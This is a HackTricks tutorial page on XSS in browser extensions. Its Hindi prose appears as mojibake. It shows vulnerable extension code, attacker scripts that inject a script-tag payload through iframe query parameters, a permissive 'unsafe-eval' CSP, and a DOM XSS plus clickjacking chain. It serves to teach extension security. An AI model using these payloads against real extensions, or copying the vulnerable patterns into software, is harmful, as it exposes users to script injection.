# BrowExt - XSS рдЙрджрд╛рд╣рд░рдг

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ **рдореБрдЭреЗ рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВ.

</details>

## Iframe рдкрд░ XSS

**Content script** рдПрдХ Iframe рдмрдирд╛рддреА рд╣реИ рдЬреЛ рдПрдХ **URL рдХреЛ iFrame рд╕реНрд░реЛрдд рдХреЗ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдореЗрдВ рдЗрдВрдЧрд┐рдд рдХрд░рддреА рд╣реИ**:
```javascript
chrome.storage.local.get("message", result =>
{
frame.src = chrome.runtime.getURL("message.html") +
"?message=" + encodeURIComponent(result.message) +
"&url=https://example.net/explanation";
});
```
рдПрдХ рдЙрдЬрд╛рдЧрд░ html рдкреГрд╖реНрда: **`message.html`**, рдЬреЛ **рдмреНрд░рд╛рдЙрдЬрд╝рд░** рд╕реЗ рд╕реБрд▓рдн рд╣реИ, рдЗрд╕рдореЗрдВ рдРрд╕рд╛ рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ:
```java
$(() =>
{
let params = new URLSearchParams(location.search);
$(document.body).append(params.get("message") + " <button>Explain</button>");
$("body > button").click(() =>
{
chrome.tabs.create({ url: params.get("url") });
});
});
```
рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдкреГрд╖реНрда рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рдВрджреЗрд╢ рдХреЛ **XSS payload** рдХреЗ рд▓рд┐рдП рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХреЗ:
```javascript
setTimeout(() =>
{
let frame = document.querySelector("iframe:last-child");
let src = frame.src;

// Remove existing query parameters
src = src.replace(/\?.*/, "");

// Add malicious query parameters
src += "?message=" + encodeURIComponent("<script>alert('XSS')</script>");

// Load into frame
frame.src = src;
}, 1000);
```
рдПрдХ рдЙрджрд╛рд░ Content Security Policy рдЬреИрд╕реЗ рдХрд┐&#x20;
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
рдЬреЗрдПрд╕ рдХреЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

XSS рдХреЛ рдЗрдЪреНрдЫрд╛рдиреБрд╕рд╛рд░ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ рдЪрд▓рд╛рдирд╛:
```javascript
let frame = document.createElement("iframe");
frame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?message="
+ encodeURIComponent("<script>alert('XSS')</script>");
document.body.appendChild(frame);
```
## DOM-based XSS + ClickJacking

рдкрд╣рд▓реА рдХрдордЬреЛрд░реА DOM-based Cross-site Scripting (XSS) рдХрдордЬреЛрд░реА рд╣реИ **`/html/bookmarks.html`** рдореЗрдВ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ JavaScript рд╣реИ рдЬреЛ рд╢рд╛рдорд┐рд▓ рд╣реИ **`bookmarks.js`** рдореЗрдВ:
```javascript
$('#btAdd').click(function() {
var btname = $('#txtName').val();
if ($('.custom-button .name').filter(function() {
return $(this).text() === btname;
}).length) return false;

var span = $('<span class="custom-button">');
span.html('<span class="name">' + btname + '</span>');
span.append('<a href="javascript:void(0)" title="remove">x</a>');
span.attr('title', btname);
span.data('id', (new Date().getTime()));
$('div.custom-buttons .existing').append(span);
save_options();
});
```
рдЙрдкрд░реЛрдХреНрдд JavaScript **`txtName`** рдЯреЗрдХреНрд╕реНрдЯ рдмреЙрдХреНрд╕ рдХреЗ **рдорд╛рди** рдХреЛ рд▓реЗрддрд╛ рд╣реИ рдФрд░ **HTML рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рдВрдпреЛрдЬрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ** рдЬрд┐рд╕реЗ jQuery рдХреЗ ["append()"](https://api.jquery.com/append/) рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ DOM рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред

рд╕рд╛рдорд╛рдиреНрдпрддрдГ, Chrome рдПрдХреНрд╕рдЯреЗрдВрд╢рди Content Security Policy (CSP) рдХреЛ рдЗрд╕ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХрд╛ рд╢реЛрд╖рдг рд╣реЛрдиреЗ рд╕реЗ рд░реЛрдХрдирд╛ рдЪрд╛рд╣рд┐рдПред рд╣рд╛рд▓рд╛рдВрдХрд┐, [**'unsafe-eval'**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕ рдиреАрддрд┐ рдХреЛ рдвреАрд▓рд╛ рдХрд░рдиреЗ рдФрд░ jQuery рдХреЗ DOM APIs рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рдХрд╛рд░рдг, рдЗрд╕реЗ рдЕрднреА рднреА **рд╢реЛрд╖рдг** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛ред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ jQuery рдХреЗ DOM APIs рдореЗрдВ рд╕реЗ рдЕрдзрд┐рдХрд╛рдВрд╢ [тАЬglobalEval()тАЭ](https://api.jquery.com/jquery.globaleval/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ DOM рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рдкрд░ [тАЬeval()тАЭ](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) рдХреЛ рдкрд╛рд╕ рдХрд░ рджреЗрддрд╛ рд╣реИред

рдпрджреНрдпрдкрд┐ рдпрд╣ рдПрдХ рдЧрдВрднреАрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рд╣реИ, рдЕрдкрдиреЗ рдЖрдк рдореЗрдВ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд╛рдлреА рд╕реАрдорд┐рдд рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рд╕рдВрдкрд░реНрдХ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**ред рдкреАрдбрд╝рд┐рдд рдХреЛ рдкреЗрдЬ рдЦреЛрд▓рдирд╛ рд╣реЛрдЧрд╛, рдлреАрд▓реНрдб рдореЗрдВ Cross-site Scripting (XSS) рдкреЗрд▓реЛрдб рдкреЗрд╕реНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдФрд░ рдЗрд╕реЗ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП "Add" рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдЗрд╕ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХреЛ рдмреЗрд╣рддрд░ рдврдВрдЧ рд╕реЗ рд╣рдерд┐рдпрд╛рд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдо рдПрдХ рдЕрд▓рдЧ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ (**clickjacking**) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдорд▓реЗ рдХреЛ рдордЬрдмреВрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд Chrome рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдореИрдирд┐рдлреЗрд╕реНрдЯ рд╕реЗ рдПрдХ рдЕрдВрд╢ рд╣реИ:
```json
...trimmed for brevity...
"web_accessible_resources": [
"_locales/*",
"bundle/*",
"dist/*",
"assets/*",
"font/*",
"html/bookmarks.html",
"css/*.css",
"js/*.js",
"js/jquery/*.js",
"js/lang/*"
],
...trimmed for brevity...
```
рдЙрдкрд░реЛрдХреНрдд рдЦрдВрдб рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЕрдкрдиреА **`web_accessible_resources`** рдиреАрддрд┐ рдХреЗ рд╕рд╛рде рд╡реНрдпрд╛рдкрдХ рдЬрд╛рд▓ рдмрд┐рдЫрд╛рддрд╛ рд╣реИред

**`/html/bookmarks.html`** рдкреГрд╖реНрда рднреА **framed** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ **clickjacking** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **exploited** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рдо рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдо рдЗрд╕ рдкреГрд╖реНрда рдХреЛ рд╣рдорд╛рд░реЗ рд╡реЗрдм рдкреЗрдЬ рдореЗрдВ iframe рдХрд░ рд╕рдХреЗрдВ, рдФрд░ **DOM рддрддреНрд╡реЛрдВ рдХреЗ рд╕рд╛рде рдлреНрд░реЗрдо рдХреЛ рдУрд╡рд░рд▓реЗ рдХрд░рдХреЗ рд▓реЗрдЖрдЙрдЯ рдХреЛ рд░реАрдбреНрд░реЗрд╕ рдХрд░реЗрдВ**ред рдЗрд╕рд╕реЗ рдпрд╣ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдкреАрдбрд╝рд┐рдд рдХреЛ рдпрд╣ рдкрддрд╛ рдирд╣реАрдВ рдЪрд▓рддрд╛ рдХрд┐ рд╡реЗ **рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдиреАрдЪреЗ рдХреЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░ рд░рд╣реЗ рд╣реИрдВ**ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдПрдиреАрдореЗрд╢рди рдЗрд╕ рдкреНрд░рднрд╛рд╡ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ (рдПрдиреАрдореЗрд╢рди рдХреЛ [**рдореВрд▓ рдкреЛрд╕реНрдЯ рд▓реЗрдЦрди**](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/) рдореЗрдВ рджреЗрдЦреЗрдВ)ред

## рд╕рдВрджрд░реНрдн

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**ред
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
